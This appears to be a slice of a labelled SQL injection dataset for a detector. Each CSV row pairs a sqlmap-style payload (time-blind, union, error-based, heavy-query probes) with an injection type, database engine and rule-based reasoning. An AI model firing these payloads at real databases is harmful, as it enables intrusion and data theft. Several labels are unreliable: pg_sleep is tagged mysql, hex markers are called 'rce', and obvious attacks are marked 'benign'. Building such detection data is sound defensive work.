row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5940,1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5941,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 1624 = 1624",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
5942,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""smhd",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
5943,"-1174"" union all select 4303,4303,4303,4303#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5944,"1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
5945,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
5946,"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5947,-1217' ) ) ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5948,"iif ( 2205 = 4764,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
5949,"1"" union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5950,"select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
5951,"-5148"" ) ) or 5310 = 8229",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5952,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5953,1 ) ) ) and 9198 = 9198--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5954,1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5955,1'+ ( select 'zugq' where 9218 = 9218,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5956,"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
5957,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5958,"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
5959,"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
